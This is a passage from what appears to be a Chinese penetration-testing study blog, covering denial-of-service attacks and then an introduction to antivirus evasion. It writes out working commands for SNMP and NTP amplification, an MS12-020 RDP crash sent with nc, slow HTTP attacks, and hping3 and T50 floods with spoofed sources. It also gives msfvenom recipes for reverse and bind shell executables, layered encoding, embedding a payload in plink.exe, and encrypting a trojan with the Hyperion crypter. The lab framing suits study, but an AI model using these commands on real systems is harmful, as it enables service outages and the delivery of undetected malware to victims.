<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; b=SNMPbulk()</span><br><span class="line">&gt;&gt;&gt; b.max_repetitions=<span class="number">100</span></span><br><span class="line">&gt;&gt;&gt; b.varbindlist=[SNMPvarbind(oid=ASN1_OID('<span class="number">1.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span>')),SNMPvarbind(oid=ASN1_OID('<span class="number">1.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.19</span><span class="number">.1</span><span class="number">.3</span>'))]</span><br><span class="line">&gt;&gt;&gt; b.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/9Z7Rq86.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/3m6lmhQ.png" alt="img"></p>
<p><strong>设置 SNMP 数据包</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.PDU=b</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/d0jMjxp.png" alt="img"></p>
<p><strong>合成完整数据包</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=(i/u/s)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.display()</span><br></pre></td></tr></table></figure>

<p><strong>发送数据包</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; sr1(r)</span><br></pre></td></tr></table></figure>

<p>发送 98 字节，返回 4534 字节的数据包</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/nJUfGfh.png" alt></p>
<p><strong>测试放大200倍效果</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; b.max_repetitions=<span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.PDU=b</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; s.display()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/1deTNBV.png" alt="img"></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; r=(i/u/s)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; r.display()</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; sr1(r)</span><br></pre></td></tr></table></figure>

<p>发送 99 字节，返回 8894 字节</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/e2RFmyd.png" alt="img"></p>
<h3 id="拒绝服务——NTP-放大攻击"><a href="#拒绝服务——NTP-放大攻击" class="headerlink" title="拒绝服务——NTP 放大攻击"></a>拒绝服务——NTP 放大攻击</h3><h4 id="1-简介-5"><a href="#1-简介-5" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
<li>网络时间协议<ul>
<li>Network Time Protocol</li>
<li>保证网络设备时间同步</li>
<li>电子设备互相干扰导致时钟差异越来越大</li>
<li>影响应用正常运行、日志审计不可信</li>
<li>服务端口UDP 123</li>
</ul>
</li>
<li>攻击原理<ul>
<li>NTP 服务提monlist (MON_GETLIST) 查询功能<ul>
<li>监控NTP 服务器的状况 </li>
</ul>
</li>
</ul>
</li>
<li>客户端查询时，NTP服务器返回最后同步时间的600 个客户端IP</li>
<li>每6个IP一个数据包，最多100个数据包(放大约100倍)</li>
</ul>
<h4 id="2-扫描NTP服务器"><a href="#2-扫描NTP服务器" class="headerlink" title="2.扫描NTP服务器"></a>2.扫描NTP服务器</h4><p>1.服务器安装 ntp</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@xu:~# apt-<span class="builtin-name">get</span> install ntp</span><br><span class="line">root@xu:~# netstat -tulnp | grep 123</span><br></pre></td></tr></table></figure>

<p>2.kali扫描发现http服务器</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# nmap -sU -p <span class="number">123</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">24</span> --open</span><br><span class="line"><span class="symbol">root@</span>kali:~# nmap -sU -p <span class="number">123</span> -sV <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br></pre></td></tr></table></figure>

<p>3.kali 扫描发现漏洞</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# ntpdc -n -c monlist <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span>: timed <span class="keyword">out</span>, nothing received</span><br><span class="line">***Request timed <span class="keyword">out</span>    # 说明不存在漏洞</span><br></pre></td></tr></table></figure>

<p>4.配置 ntp 服务器配置</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">注释 38 和 39行</span><br><span class="line"><span class="comment"># restrict -4 default kod notrap nomodify nopeer noquery limited</span></span><br><span class="line"><span class="comment"># restrict -6 default kod notrap nomodify nopeer noquery limited</span></span><br><span class="line">root@xu:~# /etc/init.d<span class="built_in">/ntp </span>restart</span><br></pre></td></tr></table></figure>

<p>5.kali 扫描发现漏洞</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# ntpdc -n -c monlist <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br><span class="line"><span class="symbol">root@</span>kali:~# ntpq -c rv <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br><span class="line"><span class="symbol">root@</span>kali:~# ntpdc -c sysinfo <span class="number">10.10</span><span class="number">.10</span><span class="number">.138</span></span><br></pre></td></tr></table></figure>

<h4 id="3-防御策略"><a href="#3-防御策略" class="headerlink" title="3.防御策略"></a>3.防御策略</h4><ul>
<li>NTP 攻击策略<ul>
<li>升级到 ntpd 4.2.7p26 及以上版本（默认关闭 monlist 查询）</li>
<li>手动关闭 monlist 查询功能</li>
</ul>
</li>
</ul>
<h3 id="拒绝服务–应用层DoS-攻击"><a href="#拒绝服务–应用层DoS-攻击" class="headerlink" title="拒绝服务–应用层DoS 攻击"></a>拒绝服务–应用层DoS 攻击</h3><ul>
<li>应用服务漏洞<ul>
<li>服务代码存在漏洞，遇异常提交数据时程序崩溃</li>
<li>应用处理大量并发请求能力有限，被拒绝的是应用或OS</li>
</ul>
</li>
<li>缓冲区溢出漏洞<ul>
<li>向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存</li>
<li>影响: 远程代码执行、DOS</li>
<li>利用模糊测试方法发现缓冲区溢出漏洞</li>
</ul>
</li>
<li>CesarFTP 0.99 服务漏洞<ul>
<li>ftp_fuzz.py # MKD/RMD</li>
</ul>
</li>
<li>MS12-020 远程桌面协议DOS漏洞</li>
</ul>
<h4 id="2-攻击测试-MS12-020"><a href="#2-攻击测试-MS12-020" class="headerlink" title="2. 攻击测试 MS12-020"></a>2. 攻击测试 MS12-020</h4><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># searchsploit ms12-020</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cp /usr/share/exploitdb/exploits/windows/dos/18606.txt .</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># mv 18606.txt  MS12-020.txt</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># leafpad MS12-020.txt </span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc 10.10.10.141 3389 &lt; termdd_1.dat</span></span><br></pre></td></tr></table></figure>

<h4 id="3-Slowhttptest"><a href="#3-Slowhttptest" class="headerlink" title="3. Slowhttptest"></a>3. Slowhttptest</h4><ul>
<li><p>Slowhttptest (源自google)</p>
<ul>
<li>低带宽应用层慢速DOS攻击(相对于CC等快速攻击而言的慢速)</li>
<li>最早由Python编写，跨平台支持(Linux、win、Cygwin、OSX)</li>
<li>尤其擅长攻击apache.tomcat (几乎百发百中)</li>
</ul>
</li>
<li><p>攻击方法</p>
<ul>
<li>Apache Range Header attack<ul>
<li>客户端传输大文件时，体积查过HTTP Body大小限制时进行分段</li>
<li>耗尽服务器CPU、内存资源</li>
</ul>
</li>
</ul>
</li>
<li><p>ulimite -n 70000</p>
</li>
<li><p>HTTP Post 攻击模式</p>
<ul>
<li>slowhttptest -c 1000 -B -g -o body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 10 -p 3</li>
</ul>
</li>
<li><p>slowloris 攻击模式</p>
<ul>
<li>slowhttptest -c 1000 -H -g -o header_stats -i 10 -r 200 -t GET -u <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -x 24 -p 3</li>
</ul>
</li>
<li><p>支持代理</p>
</li>
<li><p>大量应用服务器和安全设备都无法防护慢速攻击</p>
</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/Zc2XbBy.jpg" alt="img"></p>
<h4 id="4-攻击测试"><a href="#4-攻击测试" class="headerlink" title="4.攻击测试"></a>4.攻击测试</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">root@kali:~#</span> <span class="string">slowhttptest</span> <span class="string">-c</span> <span class="number">60000</span> <span class="string">-B</span> <span class="string">-g</span> <span class="string">-o</span> <span class="string">body_stats</span> <span class="string">-i</span> <span class="number">110</span> <span class="string">-r</span> <span class="number">200</span> <span class="string">-s</span> <span class="number">8192</span> <span class="string">-t</span> <span class="string">FAKEVERB</span> <span class="string">-u</span> <span class="string">http://10.10.10.132</span> <span class="string">-x</span> <span class="number">10</span> <span class="string">-p</span> <span class="number">3</span> <span class="string">-l</span> <span class="number">999999</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/z8Bx42G.png" alt="img"></p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/ptFr6br.png" alt="img"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# slowhttptest -c <span class="number">1000</span> -H -g -o my_header_stats -i <span class="number">10</span> -r <span class="number">200</span> -s <span class="number">8192</span> -t GET -u http:<span class="comment">//10.10.10.132 -x 10 -p 3</span></span><br></pre></td></tr></table></figure>



<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/q8f1NkR.png" alt="img"></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># man slowhttptest</span></span><br></pre></td></tr></table></figure>



<h3 id="拒绝服务攻击工具"><a href="#拒绝服务攻击工具" class="headerlink" title="拒绝服务攻击工具"></a>拒绝服务攻击工具</h3><h4 id="1-rudy"><a href="#1-rudy" class="headerlink" title="1.rudy"></a>1.rudy</h4><h5 id="1-简介-6"><a href="#1-简介-6" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>慢速应用层HTTP POST攻击，与slowhttptest原理相同</li>
<li>每次只传输一个字节的数据、</li>
<li>美剧黑客军团”中曾提到此攻击手段</li>
<li>攻击有表单WEB页面，攻击时需指定攻击的参数名称</li>
<li><a href="https://sourceforge.net/projects/r-u-dead-yet/" target="_blank" rel="noopener">https://sourceforge.net/projects/r-u-dead-yet/</a></li>
</ul>
<h5 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a>2.测试</h5><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/rudy</span><span class="comment"># ls</span></span><br><span class="line">BeautifulSoup.py   README          r-u-dead-yet-v2.<span class="number">2</span>.py  socks.pyc</span><br><span class="line">BeautifulSoup.pyc  rudeadyet.conf  socks.py</span><br></pre></td></tr></table></figure>

<p>修改配置文件</p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/tdPvToI.png" alt="img"></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~/rudy</span><span class="comment"># ./r-u-dead-yet-v2.2.py</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/ilCKVV2.png" alt="img"></p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/eo46mKo.png" alt="img"></p>
<h4 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h4><h5 id="1-简介-7"><a href="#1-简介-7" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li><p>几乎可以定制发送任何 TCP/IP 数据包，用于测试 FW、端口扫描、性能测试</p>
</li>
<li><p>syn flood 攻击</p>
<ul>
<li>hping3 -c 1000 -d 120 -S -w 64 -p 80 –flood –rand-source 10.10.10.132</li>
<li>hping3 -S -P -U -p 80 –flood –rand-source 10.10.10.132</li>
<li>hping3 -SARFUP -p 80 –flood –rand-source 10.10.10.132 (TCP Flood)</li>
</ul>
</li>
<li><p>ICMP Flood 攻击</p>
<ul>
<li>hping3 -q -n -a 1.1.1.1 –icmp -d 200 –flood 10.10.10.132</li>
</ul>
</li>
<li><p>UDP Flood 攻击</p>
<ul>
<li>hping3 -a 1.1.1.1 –udp -s 53 -d 100 -p 53 –flood 10.10.10.132</li>
</ul>
</li>
</ul>
<h5 id="2-攻击-1"><a href="#2-攻击-1" class="headerlink" title="2.攻击"></a>2.攻击</h5><ul>
<li><p>syn_flood 攻击</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# hping3 -c <span class="number">1000</span> -d <span class="number">120</span> -S -w <span class="number">64</span> -p <span class="number">80</span> --flood --rand-source <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/ptoKirq.png" alt="img"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">hping3 -S -P -U -p <span class="number">80</span> --flood --rand-source <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/qykXjba.png" alt="img"></p>
<ul>
<li><p>tcp_flood 攻击</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# hping3 -SARFUP -p <span class="number">80</span> --flood --rand-source <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/TX0DsTz.png" alt="img"></p>
<ul>
<li><p>icmp_flood 攻击</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">-a 伪造源地址</span><br><span class="line"><span class="symbol">root@</span>kali:~# hping3 -q -n -a <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> --icmp -d <span class="number">200</span> --flood <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/j82vMQQ.png" alt="img"></p>
</li>
<li><p>udp_flood 攻击</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# hping3 -a <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span> --udp -s <span class="number">53</span> -d <span class="number">100</span> -p <span class="number">53</span> --flood <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/yh6OGJ9.png" alt="img"></p>
</li>
</ul>
<h3 id="LAND攻击"><a href="#LAND攻击" class="headerlink" title="LAND攻击"></a>LAND攻击</h3><ul>
<li><p>特殊种类的 SYN Flood 攻击</p>
</li>
<li><p>源地址和目的地址都是靶机IP，受害者和自己完成三次握手</p>
</li>
<li><p>hping3 -n -a 10.10.10.132 -S -d 100 -p 80 –flood 10.10.10.132</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# hping3 -n -a <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> -S -d <span class="number">100</span> -p <span class="number">80</span> --flood <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/3YN6wrP.png" alt="img"></p>
</li>
</ul>
<h3 id="3-nping"><a href="#3-nping" class="headerlink" title="3.nping"></a>3.nping</h3><ul>
<li><p>TCP 全连接 DoS 攻击</p>
<ul>
<li>nping –tcp-connect –rate=10000 -c 1000000000 -q 10.10.10.132</li>
</ul>
</li>
<li><p>查公网 IP</p>
<ul>
<li>nping –echo-client “public” echo.nmap.org –udp</li>
</ul>
</li>
</ul>
<h3 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h3><ul>
<li><p>http/https 压力测试工具，模拟多个用户并发访问请求</p>
</li>
<li><p>siege -g <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a></p>
</li>
<li><p>siege -i -c 1000 <a href="http://10.10.10.132/" target="_blank" rel="noopener">http://10.10.10.132</a> -A siegehttp</p>
</li>
<li><p>同时攻击多个 url ，使用 -f 调用字典文件</p>
</li>
<li><p>单独使用 siege -i -c 1000 ，也会调用字典文件（url 列表）</p>
<ul>
<li><p>/etc/siege/urls.txt</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 banner 信息</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># siege -g http://10.10.10.132</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/Seky1di.png" alt="img"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">root@kali:<span class="symbol">~# siege -i -c 1000 http</span>:<span class="comment">//10.10.10.132 -A Mozilla/5.0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/8d3o6st.png" alt="img"></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /etc/siege/urls.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/ccML8at.png" alt="img"></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># siege -i -c 1000</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/FdDymAj.png" alt="img"></p>
<h3 id="5-T50"><a href="#5-T50" class="headerlink" title="5.T50"></a>5.T50</h3><ul>
<li><p>网络压力测试</p>
<ul>
<li><p>t50 10.10.10.132 –flood –turbo -S –protocol TCP –dport 80</p>
</li>
<li><p>t50 10.10.10.132 –flood –turbo -S TCP UDP OSPF EIGRP –dport 22</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# t50 <span class="number">10.10</span><span class="number">.10</span><span class="number">.132</span> --flood --turbo -S --protocol TCP --dport <span class="number">80</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/NzK2wiZ.png" alt="img"></p>
<p><img src="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/wJiBiqD.png" alt="img"></p>
<h4 id="6-NMAP"><a href="#6-NMAP" class="headerlink" title="6.NMAP"></a>6.NMAP</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# grep dos /usr/share/nmap/scripts/script.db | cut -d <span class="string">"\""</span> -f <span class="number">2</span></span><br><span class="line">broadcast-avahi-dos.nse</span><br><span class="line">http-slowloris.nse</span><br><span class="line">ipv6-ra-flood.nse</span><br><span class="line">smb-flood.nse</span><br><span class="line">smb-vuln-conficker.nse</span><br><span class="line">smb-vuln-cve2009<span class="number">-3103.</span>nse</span><br><span class="line">smb-vuln-ms06<span class="number">-025.</span>nse</span><br><span class="line">smb-vuln-ms07<span class="number">-029.</span>nse</span><br><span class="line">smb-vuln-ms08<span class="number">-067.</span>nse</span><br><span class="line">smb-vuln-ms10<span class="number">-054.</span>nse</span><br><span class="line">smb-vuln-regsvc-dos.nse</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>拒绝服务</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之免杀入门学习</title>
    <url>/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/</url>
    <content><![CDATA[<h2 id="渗透测试——免杀部分知识"><a href="#渗透测试——免杀部分知识" class="headerlink" title="渗透测试——免杀部分知识"></a>渗透测试——免杀部分知识</h2><h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1.恶意软件"></a>1.恶意软件</h4><ul>
<li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li>
<li>在用户非自愿的情况下执行安装<ul>
<li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li>
</ul>
</li>
</ul>
<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2.防病毒软件"></a>2.防病毒软件</h4><ul>
<li>恶意程序最主要的防护手段<ul>
<li>杀毒软件/防病毒软件</li>
<li>客户端/服务器/邮件防病毒</li>
</ul>
</li>
<li>检测原理<ul>
<li>基于二进制文件中特征签名的黑名单检测方法</li>
<li>基于行为的分析方法（启发式）</li>
</ul>
</li>
<li>事后手段<ul>
<li>永远落后于病毒发展</li>
</ul>
</li>
</ul>
<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3.免杀技术"></a>3.免杀技术</h4><ul>
<li>修改二进制文件中的特征字符<ul>
<li>替换、擦除、修改</li>
</ul>
</li>
<li>加密技术（crypter）<ul>
<li>通过加密是的特征字符不可读，从而逃避AV 检测</li>
<li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li>
</ul>
</li>
<li>防病毒软件的检测<ul>
<li>恶意程序本身的特征字符</li>
<li>加密器 cripter 的特征字符</li>
</ul>
</li>
</ul>
<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4.当前现状"></a>4.当前现状</h4><ul>
<li>恶意软件制造者<ul>
<li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li>
<li>使用独有 crypter 软件加密恶意程序</li>
<li>处事低调，尽量避免被发现</li>
<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
<li>Fully UnDetectable 还最高追求 （FUD）</li>
</ul>
</li>
<li>AV 厂商<ul>
<li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li>
<li>一般新的恶意软件安全 UD 窗口期是一周左右</li>
<li>乐毅软件制造者永无休止的拉锯战</li>
<li>信的启发式检测技术尚有待完善(误杀漏杀)</li>
</ul>
</li>
<li>单一 AV 厂商的病毒库很难达到 100% 覆盖<ul>
<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
<li>接口被某些国家的AV软禁免费利用，没有自己的病毒库</li>
</ul>
</li>
<li><a href="http://www.virscan.org/" target="_blank" rel="noopener">http://www.virscan.org/</a></li>
<li>在线多引擎查杀网站与 AV 查杀共享信息</li>
<li>搞黑的在线多引擎查毒站<ul>
<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
<li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li>
</ul>
</li>
<li>常用的 RAT 软件<ul>
<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul>
<li>生成反弹 shell</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o a.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>加密编码反弹 shell</li>
</ul>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell/bind_tcp <span class="attribute">lhost</span>=10.10.10.132 <span class="attribute">lport</span>=4444 -f<span class="built_in"> raw </span>-e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f<span class="built_in"> raw </span>| msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">'\x00'</span> -f exe -o b.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>比较编码前后的检测率</li>
</ul>
<h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul>
<li>利用模板隐藏 shell</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -a x86 --platform win -f exe -o c.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>多重编码</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -e x86/shikata_ga_nai -i <span class="number">5</span> -a x86 --platform win -f exe &gt; d.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>比较编码前后的检测率</li>
</ul>
<h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul>
<li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
<li>常被恶意软件用于免杀目的</li>
<li>Hyperion （32bit PE 程序加密器）</li>
<li>Crypter / Container（解密器 PE Loader ）</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># unzip Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成加密器</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成木马程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对木马程序进行加密</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine h.exe p.exe x.exe</span></span><br></pre></td></tr></table></figure>

<ul>
<li>比较编码前后的检测率</li>
</ul>
<h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul>
<li>Windows reverse shell</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine gcc.exe windows.c -o windows.exe -lws2_32</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Linux shell</li>
</ul>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># gcc linux_revers_shell.c -o linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -nvlp 333</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ./linux 127.0.0.1 333</span></span><br></pre></td></tr></table></figure>

